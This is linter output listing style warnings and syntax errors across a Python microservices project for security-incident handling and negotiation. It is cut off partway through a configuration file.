   --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:210:1
    |
208 |                 headers={"WWW-Authenticate": "Bearer"},
209 |             )
210 |         
    | ^^^^^^^^
211 |         # Add user to request state
212 |         request.state.user = user
    |
help: Remove whitespace from blank line

invalid-syntax: unindent does not match any outer indentation level
   --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:212:1
    |
211 |         # Add user to request state
212 |         request.state.user = user
    | ^^^^^^^^
213 |         
214 |         return await call_next(request)
    |

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:213:1
    |
211 |         # Add user to request state
212 |         request.state.user = user
213 |         
    | ^^^^^^^^
214 |         return await call_next(request)
    |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
   --> emergent-microservices\autonomous-incident-reflex-system\app\middleware.py:214:1
    |
212 |         request.state.user = user
213 |         
214 |         return await call_next(request)
    | ^^^^^^^^
    |

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\autonomous-incident-reflex-system\app\models.py:2:1
  |
1 | from datetime import datetime
2 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3 | from uuid import UUID, uuid4
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\autonomous-incident-reflex-system\app\models.py:2:1
  |
1 | from datetime import datetime
2 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3 | from uuid import UUID, uuid4
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-incident-reflex-system\app\models.py:18:15
   |
16 |     incident_type: str
17 |     description: str
18 |     metadata: Dict[str, Any]
   |               ^^^^
19 |     status: str = "detected"  # detected, analyzing, reflex_triggered, closed
20 |     evidence_hash: Optional[str] = None
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-incident-reflex-system\app\models.py:20:20
   |
18 |     metadata: Dict[str, Any]
19 |     status: str = "detected"  # detected, analyzing, reflex_triggered, closed
20 |     evidence_hash: Optional[str] = None
   |                    ^^^^^^^^^^^^^
21 |     reflex_actions_taken: List[str] = []
22 |     created_at: datetime = Field(default_factory=datetime.now)
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
  --> emergent-microservices\autonomous-incident-reflex-system\app\models.py:21:27
   |
19 |     status: str = "detected"  # detected, analyzing, reflex_triggered, closed
20 |     evidence_hash: Optional[str] = None
21 |     reflex_actions_taken: List[str] = []
   |                           ^^^^
22 |     created_at: datetime = Field(default_factory=datetime.now)
23 |     updated_at: datetime = Field(default_factory=datetime.now)
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-incident-reflex-system\app\models.py:31:15
   |
29 |     incident_type: str
30 |     description: str
31 |     metadata: Dict[str, Any]
   |               ^^^^
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-incident-reflex-system\app\models.py:35:13
   |
34 | class IncidentUpdate(BaseModel):
35 |     status: Optional[str] = None
   |             ^^^^^^^^^^^^^
36 |     evidence_hash: Optional[str] = None
37 |     reflex_actions_taken: Optional[List[str]] = None
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-incident-reflex-system\app\models.py:36:20
   |
34 | class IncidentUpdate(BaseModel):
35 |     status: Optional[str] = None
36 |     evidence_hash: Optional[str] = None
   |                    ^^^^^^^^^^^^^
37 |     reflex_actions_taken: Optional[List[str]] = None
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-incident-reflex-system\app\models.py:37:27
   |
35 |     status: Optional[str] = None
36 |     evidence_hash: Optional[str] = None
37 |     reflex_actions_taken: Optional[List[str]] = None
   |                           ^^^^^^^^^^^^^^^^^^^
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
  --> emergent-microservices\autonomous-incident-reflex-system\app\models.py:37:36
   |
35 |     status: Optional[str] = None
36 |     evidence_hash: Optional[str] = None
37 |     reflex_actions_taken: Optional[List[str]] = None
   |                                    ^^^^
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> emergent-microservices\autonomous-incident-reflex-system\app\models.py:41:12
   |
40 | class PaginatedIncidents(BaseModel):
41 |     items: List[SecurityIncident]
   |            ^^^^
42 |     total: int
43 |     page: int
   |
help: Replace with `list`

F401 [*] `time` imported but unused
 --> emergent-microservices\autonomous-incident-reflex-system\app\repository.py:5:8
  |
3 | """
4 |
5 | import time
  |        ^^^^
6 | from datetime import datetime
7 | from typing import Any, Dict, List, Optional, Tuple
  |
help: Remove unused import: `time`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\autonomous-incident-reflex-system\app\repository.py:7:1
  |
5 | import time
6 | from datetime import datetime
7 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 | from uuid import UUID
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\autonomous-incident-reflex-system\app\repository.py:7:1
  |
5 | import time
6 | from datetime import datetime
7 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 | from uuid import UUID
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> emergent-microservices\autonomous-incident-reflex-system\app\repository.py:7:1
  |
5 | import time
6 | from datetime import datetime
7 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 | from uuid import UUID
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-incident-reflex-system\app\repository.py:16:20
   |
14 | class Database:
15 |     def __init__(self):
16 |         self.data: Dict[str, Any] = {"incidents": {}}
   |                    ^^^^
17 |         self.connected = False
   |
help: Replace with `dict`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
  --> emergent-microservices\autonomous-incident-reflex-system\app\repository.py:37:10
   |
35 |     async def list(
36 |         self, offset: int = 0, limit: int = 20
37 |     ) -> Tuple[List[SecurityIncident], int]:
   |          ^^^^^
38 |         items = list(self.db.data["incidents"].values())
39 |         items.sort(key=lambda x: x.created_at, reverse=True)
   |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
  --> emergent-microservices\autonomous-incident-reflex-system\app\repository.py:37:16
   |
35 |     async def list(
36 |         self, offset: int = 0, limit: int = 20
37 |     ) -> Tuple[List[SecurityIncident], int]:
   |                ^^^^
38 |         items = list(self.db.data["incidents"].values())
39 |         items.sort(key=lambda x: x.created_at, reverse=True)
   |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-incident-reflex-system\app\repository.py:42:47
   |
40 |         return items[offset : offset + limit], len(items)
41 |
42 |     async def get(self, incident_id: UUID) -> Optional[SecurityIncident]:
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^^^
43 |         return self.db.data["incidents"].get(str(incident_id))
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-incident-reflex-system\app\repository.py:50:43
   |
49 |     async def update(
50 |         self, incident_id: UUID, updates: Dict[str, Any]
   |                                           ^^^^
51 |     ) -> SecurityIncident:
52 |         incident = await self.get(incident_id)
   |
help: Replace with `dict`

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\autonomous-incident-reflex-system\app\routes.py:5:1
  |
3 | """
4 |
5 | from typing import List
  | ^^^^^^^^^^^^^^^^^^^^^^^
6 | from uuid import UUID
  |

F401 [*] `typing.List` imported but unused
 --> emergent-microservices\autonomous-incident-reflex-system\app\routes.py:5:20
  |
3 | """
4 |
5 | from typing import List
  |                    ^^^^
6 | from uuid import UUID
  |
help: Remove unused import: `typing.List`

F401 [*] `.logging_config.logger` imported but unused
  --> emergent-microservices\autonomous-incident-reflex-system\app\routes.py:10:29
   |
 8 | from fastapi import APIRouter, Body, Depends, Path, Query, status
 9 |
10 | from .logging_config import logger
   |                             ^^^^^^
11 | from .models import (
12 |     IncidentCreate,
   |
help: Remove unused import: `.logging_config.logger`

F401 [*] `.models.IncidentUpdate` imported but unused
  --> emergent-microservices\autonomous-incident-reflex-system\app\routes.py:13:5
   |
11 | from .models import (
12 |     IncidentCreate,
13 |     IncidentUpdate,
   |     ^^^^^^^^^^^^^^
14 |     PaginatedIncidents,
15 |     SecurityIncident,
   |
help: Remove unused import: `.models.IncidentUpdate`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> emergent-microservices\autonomous-incident-reflex-system\app\security.py:8:1
   |
 6 | import secrets
 7 | from datetime import datetime, timedelta
 8 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | import jwt
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> emergent-microservices\autonomous-incident-reflex-system\app\security.py:8:1
   |
 6 | import secrets
 7 | from datetime import datetime, timedelta
 8 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | import jwt
   |

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-incident-reflex-system\app\security.py:32:44
   |
32 | def create_jwt_token(subject: str, claims: Optional[Dict[str, Any]] = None) -> str:
   |                                            ^^^^^^^^^^^^^^^^^^^^^^^^
33 |     """Create JWT token"""
34 |     now = datetime.utcnow()
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-incident-reflex-system\app\security.py:32:53
   |
32 | def create_jwt_token(subject: str, claims: Optional[Dict[str, Any]] = None) -> str:
   |                                                     ^^^^
33 |     """Create JWT token"""
34 |     now = datetime.utcnow()
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-incident-reflex-system\app\security.py:49:37
   |
49 | def verify_jwt_token(token: str) -> Optional[Dict[str, Any]]:
   |                                     ^^^^^^^^^^^^^^^^^^^^^^^^
50 |     """Verify JWT token and return payload"""
51 |     try:
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-incident-reflex-system\app\security.py:49:46
   |
49 | def verify_jwt_token(token: str) -> Optional[Dict[str, Any]]:
   |                                              ^^^^
50 |     """Verify JWT token and return payload"""
51 |     try:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> emergent-microservices\autonomous-incident-reflex-system\app\security.py:103:19
    |
102 | # Role -> Permissions mapping
103 | ROLE_PERMISSIONS: Dict[str, List[str]] = {
    |                   ^^^^
104 |     Role.VIEWER: [Permission.READ],
105 |     Role.EDITOR: [Permission.READ, Permission.WRITE],
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> emergent-microservices\autonomous-incident-reflex-system\app\security.py:103:29
    |
102 | # Role -> Permissions mapping
103 | ROLE_PERMISSIONS: Dict[str, List[str]] = {
    |                             ^^^^
104 |     Role.VIEWER: [Permission.READ],
105 |     Role.EDITOR: [Permission.READ, Permission.WRITE],
    |
help: Replace with `list`

F401 [*] `datetime.datetime` imported but unused
 --> emergent-microservices\autonomous-incident-reflex-system\app\services.py:6:22
  |
5 | import asyncio
6 | from datetime import datetime, timezone
  |                      ^^^^^^^^
7 | from typing import Any, Dict, List, Optional, Tuple
8 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `datetime.timezone` imported but unused
 --> emergent-microservices\autonomous-incident-reflex-system\app\services.py:6:32
  |
5 | import asyncio
6 | from datetime import datetime, timezone
  |                                ^^^^^^^^
7 | from typing import Any, Dict, List, Optional, Tuple
8 | from uuid import UUID
  |
help: Remove unused import

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\autonomous-incident-reflex-system\app\services.py:7:1
  |
5 | import asyncio
6 | from datetime import datetime, timezone
7 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 | from uuid import UUID
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\autonomous-incident-reflex-system\app\services.py:7:1
  |
5 | import asyncio
6 | from datetime import datetime, timezone
7 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 | from uuid import UUID
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> emergent-microservices\autonomous-incident-reflex-system\app\services.py:7:1
  |
5 | import asyncio
6 | from datetime import datetime, timezone
7 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 | from uuid import UUID
  |

F401 [*] `typing.Any` imported but unused
 --> emergent-microservices\autonomous-incident-reflex-system\app\services.py:7:20
  |
5 | import asyncio
6 | from datetime import datetime, timezone
7 | from typing import Any, Dict, List, Optional, Tuple
  |                    ^^^
8 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `typing.Dict` imported but unused
 --> emergent-microservices\autonomous-incident-reflex-system\app\services.py:7:25
  |
5 | import asyncio
6 | from datetime import datetime, timezone
7 | from typing import Any, Dict, List, Optional, Tuple
  |                         ^^^^
8 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `typing.Optional` imported but unused
 --> emergent-microservices\autonomous-incident-reflex-system\app\services.py:7:37
  |
5 | import asyncio
6 | from datetime import datetime, timezone
7 | from typing import Any, Dict, List, Optional, Tuple
  |                                     ^^^^^^^^
8 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `.models.IncidentUpdate` imported but unused
  --> emergent-microservices\autonomous-incident-reflex-system\app\services.py:12:37
   |
10 | from .errors import NotFoundError
11 | from .logging_config import logger
12 | from .models import IncidentCreate, IncidentUpdate, SecurityIncident
   |                                     ^^^^^^^^^^^^^^
13 | from .repository import IncidentRepository
   |
help: Remove unused import: `.models.IncidentUpdate`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
  --> emergent-microservices\autonomous-incident-reflex-system\app\services.py:63:10
   |
61 |     async def list_incidents(
62 |         self, offset: int = 0, limit: int = 20
63 |     ) -> Tuple[List[SecurityIncident], int]:
   |          ^^^^^
64 |         return await self.repository.list(offset, limit)
   |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
  --> emergent-microservices\autonomous-incident-reflex-system\app\services.py:63:16
   |
61 |     async def list_incidents(
62 |         self, offset: int = 0, limit: int = 20
63 |     ) -> Tuple[List[SecurityIncident], int]:
   |                ^^^^
64 |         return await self.repository.list(offset, limit)
   |
help: Replace with `list`

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\autonomous-incident-reflex-system\database\scripts\integrity_check.py:7:1
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> emergent-microservices\autonomous-incident-reflex-system\database\scripts\integrity_check.py:7:1
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

F401 [*] `typing.List` imported but unused
 --> emergent-microservices\autonomous-incident-reflex-system\database\scripts\integrity_check.py:7:20
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  |                    ^^^^
  |
help: Remove unused import

F401 [*] `typing.Tuple` imported but unused
 --> emergent-microservices\autonomous-incident-reflex-system\database\scripts\integrity_check.py:7:26
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  |                          ^^^^^
  |
help: Remove unused import

F821 Undefined name `check_integrity`
  --> emergent-microservices\autonomous-incident-reflex-system\database\scripts\integrity_check.py:13:20
   |
11 |     print("Running database integrity checks...")
12 |
13 |     errors = await check_integrity()
   |                    ^^^^^^^^^^^^^^^
14 |
15 |     if errors:
   |

F821 Undefined name `rollback_migration`
  --> emergent-microservices\autonomous-incident-reflex-system\database\scripts\rollback.py:16:21
   |
15 |     version = int(sys.argv[1])
16 |     success = await rollback_migration(version)
   |                     ^^^^^^^^^^^^^^^^^^
17 |     sys.exit(0 if success else 1)
   |

invalid-syntax: missing closing quote in string literal
 --> emergent-microservices\autonomous-incident-reflex-system\setup.py:6:17
  |
4 |     name="Autonomous Incident Reflex System",
5 |     version="1.0.0",
6 |     description="Build:
  |                 ^^^^^^^
7 | Threat detection microservice
8 | Policy evaluation gate
  |

invalid-syntax: Expected `,`, found name
 --> emergent-microservices\autonomous-incident-reflex-system\setup.py:7:1
  |
5 |     version="1.0.0",
6 |     description="Build:
7 | Threat detection microservice
  | ^^^^^^
8 | Policy evaluation gate
9 | Reflexive action executor
  |

invalid-syntax: Expected `,`, found name
 --> emergent-microservices\autonomous-incident-reflex-system\setup.py:7:8
  |
5 |     version="1.0.0",
6 |     description="Build:
7 | Threat detection microservice
  |        ^^^^^^^^^
8 | Policy evaluation gate
9 | Reflexive action executor
  |

invalid-syntax: Expected `,`, found name
 --> emergent-microservices\autonomous-incident-reflex-system\setup.py:7:18
  |
5 |     version="1.0.0",
6 |     description="Build:
7 | Threat detection microservice
  |                  ^^^^^^^^^^^^
8 | Policy evaluation gate
9 | Reflexive action executor
  |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:8:1
   |
 6 |     description="Build:
 7 | Threat detection microservice
 8 | Policy evaluation gate
   | ^^^^^^
 9 | Reflexive action executor
10 | Evidence preservation pipeline
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:8:8
   |
 6 |     description="Build:
 7 | Threat detection microservice
 8 | Policy evaluation gate
   |        ^^^^^^^^^^
 9 | Reflexive action executor
10 | Evidence preservation pipeline
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:8:19
   |
 6 |     description="Build:
 7 | Threat detection microservice
 8 | Policy evaluation gate
   |                   ^^^^
 9 | Reflexive action executor
10 | Evidence preservation pipeline
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:9:1
   |
 7 | Threat detection microservice
 8 | Policy evaluation gate
 9 | Reflexive action executor
   | ^^^^^^^^^
10 | Evidence preservation pipeline
11 | Cryptographic chain-of-custody service
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:9:11
   |
 7 | Threat detection microservice
 8 | Policy evaluation gate
 9 | Reflexive action executor
   |           ^^^^^^
10 | Evidence preservation pipeline
11 | Cryptographic chain-of-custody service
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:9:18
   |
 7 | Threat detection microservice
 8 | Policy evaluation gate
 9 | Reflexive action executor
   |                  ^^^^^^^^
10 | Evidence preservation pipeline
11 | Cryptographic chain-of-custody service
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:10:1
   |
 8 | Policy evaluation gate
 9 | Reflexive action executor
10 | Evidence preservation pipeline
   | ^^^^^^^^
11 | Cryptographic chain-of-custody service
12 | Think: CrowdStrike + immutable evidence + deterministic replay.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:10:10
   |
 8 | Policy evaluation gate
 9 | Reflexive action executor
10 | Evidence preservation pipeline
   |          ^^^^^^^^^^^^
11 | Cryptographic chain-of-custody service
12 | Think: CrowdStrike + immutable evidence + deterministic replay.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:10:23
   |
 8 | Policy evaluation gate
 9 | Reflexive action executor
10 | Evidence preservation pipeline
   |                       ^^^^^^^^
11 | Cryptographic chain-of-custody service
12 | Think: CrowdStrike + immutable evidence + deterministic replay.
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:11:1
   |
 9 | Reflexive action executor
10 | Evidence preservation pipeline
11 | Cryptographic chain-of-custody service
   | ^^^^^^^^^^^^^
12 | Think: CrowdStrike + immutable evidence + deterministic replay.
13 | Defense sector eats this up.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:11:15
   |
 9 | Reflexive action executor
10 | Evidence preservation pipeline
11 | Cryptographic chain-of-custody service
   |               ^^^^^
12 | Think: CrowdStrike + immutable evidence + deterministic replay.
13 | Defense sector eats this up.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:11:32
   |
 9 | Reflexive action executor
10 | Evidence preservation pipeline
11 | Cryptographic chain-of-custody service
   |                                ^^^^^^^
12 | Think: CrowdStrike + immutable evidence + deterministic replay.
13 | Defense sector eats this up.",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:12:1
   |
10 | Evidence preservation pipeline
11 | Cryptographic chain-of-custody service
12 | Think: CrowdStrike + immutable evidence + deterministic replay.
   | ^^^^^
13 | Defense sector eats this up.",
14 |     author="IAmSoThirsty",
   |

invalid-syntax: Expected `,`, found `:`
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:12:6
   |
10 | Evidence preservation pipeline
11 | Cryptographic chain-of-custody service
12 | Think: CrowdStrike + immutable evidence + deterministic replay.
   |      ^
13 | Defense sector eats this up.",
14 |     author="IAmSoThirsty",
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:12:8
   |
10 | Evidence preservation pipeline
11 | Cryptographic chain-of-custody service
12 | Think: CrowdStrike + immutable evidence + deterministic replay.
   |        ^^^^^^^^^^^^^^^^^^^^^^^
13 | Defense sector eats this up.",
14 |     author="IAmSoThirsty",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:12:32
   |
10 | Evidence preservation pipeline
11 | Cryptographic chain-of-custody service
12 | Think: CrowdStrike + immutable evidence + deterministic replay.
   |                                ^^^^^^^^
13 | Defense sector eats this up.",
14 |     author="IAmSoThirsty",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:12:57
   |
10 | Evidence preservation pipeline
11 | Cryptographic chain-of-custody service
12 | Think: CrowdStrike + immutable evidence + deterministic replay.
   |                                                         ^^^^^^
13 | Defense sector eats this up.",
14 |     author="IAmSoThirsty",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:13:9
   |
11 | Cryptographic chain-of-custody service
12 | Think: CrowdStrike + immutable evidence + deterministic replay.
13 | Defense sector eats this up.",
   |         ^^^^^^
14 |     author="IAmSoThirsty",
15 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:13:16
   |
11 | Cryptographic chain-of-custody service
12 | Think: CrowdStrike + immutable evidence + deterministic replay.
13 | Defense sector eats this up.",
   |                ^^^^
14 |     author="IAmSoThirsty",
15 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:13:21
   |
11 | Cryptographic chain-of-custody service
12 | Think: CrowdStrike + immutable evidence + deterministic replay.
13 | Defense sector eats this up.",
   |                     ^^^^
14 |     author="IAmSoThirsty",
15 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:13:26
   |
11 | Cryptographic chain-of-custody service
12 | Think: CrowdStrike + immutable evidence + deterministic replay.
13 | Defense sector eats this up.",
   |                          ^^
14 |     author="IAmSoThirsty",
15 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:13:26
   |
11 | Cryptographic chain-of-custody service
12 | Think: CrowdStrike + immutable evidence + deterministic replay.
13 | Defense sector eats this up.",
   |                          ^^^
14 |     author="IAmSoThirsty",
15 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: missing closing quote in string literal
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:13:29
   |
11 | Cryptographic chain-of-custody service
12 | Think: CrowdStrike + immutable evidence + deterministic replay.
13 | Defense sector eats this up.",
   |                             ^^
14 |     author="IAmSoThirsty",
15 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found string
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:13:29
   |
11 | Cryptographic chain-of-custody service
12 | Think: CrowdStrike + immutable evidence + deterministic replay.
13 | Defense sector eats this up.",
   |                             ^^
14 |     author="IAmSoThirsty",
15 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-incident-reflex-system\setup.py:14:5
   |
12 | Think: CrowdStrike + immutable evidence + deterministic replay.
13 | Defense sector eats this up.",
14 |     author="IAmSoThirsty",
   |     ^^^^^^
15 |     packages=find_packages(exclude=["tests", "tests.*"]),
16 |     python_requires=">=3.11",
   |

UP035 [*] Import from `collections.abc` instead: `AsyncGenerator`
 --> emergent-microservices\autonomous-incident-reflex-system\tests\conftest.py:4:1
  |
3 | import asyncio
4 | from typing import AsyncGenerator
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5 |
6 | import pytest
  |
help: Import from `collections.abc`

F401 [*] `typing.AsyncGenerator` imported but unused
 --> emergent-microservices\autonomous-incident-reflex-system\tests\conftest.py:4:20
  |
3 | import asyncio
4 | from typing import AsyncGenerator
  |                    ^^^^^^^^^^^^^^
5 |
6 | import pytest
  |
help: Remove unused import: `typing.AsyncGenerator`

F704 `await` statement outside of a function
  --> emergent-microservices\autonomous-incident-reflex-system\tests\conftest.py:30:1
   |
29 | database.data.clear()
30 | await database.disconnect()
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

F401 [*] `pytest` imported but unused
 --> emergent-microservices\autonomous-incident-reflex-system\tests\test_main.py:3:8
  |
1 | """Test main application"""
2 |
3 | import pytest
  |        ^^^^^^
4 | from fastapi.testclient import TestClient
  |
help: Remove unused import: `pytest`

F401 [*] `pytest` imported but unused
 --> emergent-microservices\autonomous-incident-reflex-system\tests\test_routes.py:5:8
  |
3 | from uuid import uuid4
4 |
5 | import pytest
  |        ^^^^^^
6 | from fastapi.testclient import TestClient
  |
help: Remove unused import: `pytest`

F401 [*] `app.main.app` imported but unused
 --> emergent-microservices\autonomous-incident-reflex-system\tests\test_routes.py:8:22
  |
6 | from fastapi.testclient import TestClient
7 |
8 | from app.main import app
  |                      ^^^
  |
help: Remove unused import: `app.main.app`

F401 [*] `pytest` imported but unused
 --> emergent-microservices\autonomous-incident-reflex-system\tests\test_security.py:3:8
  |
1 | """Test security functions"""
2 |
3 | import pytest
  |        ^^^^^^
4 |
5 | from app.security import (
  |
help: Remove unused import: `pytest`

F401 [*] `app.models.ItemUpdate` imported but unused
 --> emergent-microservices\autonomous-incident-reflex-system\tests\test_services.py:8:36
  |
7 | from app.errors import NotFoundError
8 | from app.models import ItemCreate, ItemUpdate
  |                                    ^^^^^^^^^^
9 | from app.services import ItemService
  |
help: Remove unused import: `app.models.ItemUpdate`

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\config.py:12:1
   |
10 | class Settings(BaseSettings):
11 |     """Application settings with validation"""
12 |     
   | ^^^^
13 |     # Service Metadata
14 |     SERVICE_NAME: str = "Autonomous Negotiation Agent Infrastructure"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\config.py:17:1
   |
15 |     VERSION: str = "1.0.0"
16 |     ENVIRONMENT: str = Field(default="development", pattern="^(development|staging|production)$")
17 |     
   | ^^^^
18 |     # Server Configuration
19 |     HOST: str = "0.0.0.0"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-negotiation-agent\app\config.py:22:1
   |
20 |     PORT: int = 8000
21 |     API_PREFIX: str = "/api/v1"
22 |     
   | ^^^^
23 |     # Security
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\autonomous-negotiation-agent\app\config.py:25:1
   |
23 |     # Security
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
25 |     API_KEY_HEADER: str = "X-API-Key"
   | ^^^^
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
27 |     JWT_ALGORITHM: str = "HS256"
   |

invalid-syntax: Expected a statement
  --> emergent-microservices\autonomous-negotiation-agent\app\config.py:26:1
   |
24 | API_KEYS: List[str] = Field(default_factory=lambda: os.getenv("API_KEYS", "changeme").split(","))
25 |     API_KEY_HEADER: str = "X-API-Key"
26 | JWT_SECRET: str = Field(default="changeme-secret-key")
   | ^
